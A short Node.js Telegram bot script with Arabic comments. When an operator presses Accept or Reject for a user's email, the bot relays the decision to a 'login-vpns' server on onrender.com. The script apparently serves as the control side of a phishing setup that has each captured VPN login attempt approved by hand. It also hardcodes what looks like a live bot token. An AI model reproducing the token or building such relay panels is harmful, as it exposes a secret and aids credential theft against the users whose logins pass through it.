const TelegramBot = require('node-telegram-bot-api');

const token = '7828630167:AAG8iKwW5-NKU7OsmYDGmxip3NhhDBKLXVk';
const bot = new TelegramBot(token, { polling: true });

// عرض أخطاء polling
bot.on("polling_error", (error) => {
    console.error("⛔ polling_error:", error.message);
});

// عند الضغط على زر Accept أو Reject
bot.on('callback_query', async (callbackQuery) => {
    const data = callbackQuery.data; // مثال: accept|email@example.com
    const chatId = callbackQuery.message.chat.id;

    console.log('📥 تم الضغط على الزر:', data);

    const baseUrl = 'https://login-vpns.onrender.com';

    try {
        const [action, userId] = data.split('|'); // تفصيل: 'accept' و 'email@example.com'

        if (!action || !userId) {
            bot.sendMessage(chatId, '⚠️ بيانات غير صحيحة في الزر.');
            return;
        }

        // إرسال القرار للسيرفر
        await fetch(`${baseUrl}/update-status?userId=${encodeURIComponent(userId)}&status=${action}`);

        if (action === 'accept') {
            bot.sendMessage(chatId, `✅ تم قبول محاولة تسجيل الدخول لـ ${userId}.`);
        } else if (action === 'reject') {
            bot.sendMessage(chatId, `❌ تم رفض محاولة تسجيل الدخول لـ ${userId}.`);
        }
    } catch (err) {
        console.error('❌ خطأ أثناء المعالجة:', err);
        bot.sendMessage(chatId, '⚠️ حدث خطأ أثناء إرسال القرار للسيرفر.');
    }

    bot.answerCallbackQuery(callbackQuery.id);
});
